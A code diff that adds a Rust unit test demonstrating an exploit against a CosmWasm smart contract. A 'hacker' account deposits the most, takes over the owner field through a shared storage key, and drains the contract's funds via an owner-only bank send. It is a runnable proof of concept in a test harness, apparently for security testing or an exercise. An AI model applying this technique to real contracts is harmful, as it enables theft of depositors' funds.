@@ -141,4 +141,84 @@ pub mod tests {
         let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
         assert_eq!(bal.amount, Uint128::new(100));
     }
+
+
+    #[test]
+    fn all_your_base() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // give "hacker" 1_001 tokens and "grug" 1_000 tokens
+        app = mint_tokens(app, "hacker".to_string(), Uint128::from(1_001u128));
+        app = mint_tokens(app, "grug".to_string(), Uint128::from(1_000u128));
+
+        // Verify that "admin" is contract owner to start
+        let config: crate::msg::ConfigQueryResponse = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, Addr::unchecked("admin"));
+
+        // "grug" deposits 1_000 tokens
+        app.execute_contract(
+            Addr::unchecked("grug"),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(1_000, DENOM)],
+        )
+        .unwrap();
+        let grug_bal = app.wrap().query_balance("grug", DENOM).unwrap();
+        assert_eq!(grug_bal.amount, Uint128::zero());
+
+        // "hacker" deposits 1_001 tokens, is now "TOP_DEPOSITOR"
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(1_001, DENOM)],
+        )
+        .unwrap();
+        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
+        assert_eq!(hacker_bal.amount, Uint128::zero());
+
+        // Query top depositor
+        let top: Addr = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
+            .unwrap();
+        assert_eq!(top, Addr::unchecked("hacker"));
+
+        // But "TOP_DEPOSITOR" and "OWNER" are both stored under the same key namespace of "address"
+        let config: crate::msg::ConfigQueryResponse = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, Addr::unchecked("hacker"));
+
+        // that's not good...
+        // "hacker" queries balance of contract and sends themselves all the tokens
+        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
+        let steal_funds_msg: cosmwasm_std::CosmosMsg = cosmwasm_std::CosmosMsg::Bank(cosmwasm_std::BankMsg::Send { 
+            to_address: "hacker".to_string(), 
+            amount: vec![coin(contract_bal.amount.u128(), DENOM)]
+        });
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction { 
+                msg: steal_funds_msg
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Assert that hacker now has 2_001 tokens
+        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
+        assert_eq!(hacker_bal.amount, Uint128::new(2_001));
+
+        // Assert that contract has none
+        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
+        assert_eq!(contract_bal.amount, Uint128::zero());
+
+    }
+
 }
